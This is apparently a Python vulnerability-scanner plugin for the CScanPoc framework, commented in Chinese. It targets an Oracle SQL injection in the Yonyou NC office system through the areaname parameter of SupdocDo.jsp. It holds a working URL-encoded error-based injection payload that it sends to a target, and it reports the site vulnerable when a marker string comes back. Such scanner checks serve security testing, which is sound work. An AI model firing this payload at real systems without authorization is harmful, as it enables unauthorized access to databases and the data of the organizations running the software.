# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0022'  # 平台漏洞编号，留空
    name = '用友NC综合办公系统前台Oracle注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-07-03'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友NC综合办公系统前台Oracle注入漏洞：
        /epp/html/nodes/upload/SupdocDo.jsp?areaname=areaname=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0124173'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c10457d8-cefe-4e2d-85f0-fc5ae9e2aa74'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer http://www.wooyun.org/bugs/wooyun-2015-0124173
            payload = "/epp/html/nodes/upload/SupdocDo.jsp?areaname=areaname=1%27%20AND%202538=%28SELECT%20UPPER%28XMLType%28CHR%2860%29||CHR%2858%29||CHR%28113%29||CHR%28118%29||CHR%2898%29||CHR%28112%29||CHR%28113%29||%28SELECT%20%28CASE%20WHEN%20%282538=2538%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29||CHR%28113%29||CHR%28112%29||CHR%28112%29||CHR%28106%29||CHR%28113%29||CHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27iLAM%27=%27iLAM&supdocname=1&pk_singleplan=1"
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 500 and 'qvbpq1qppjq' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
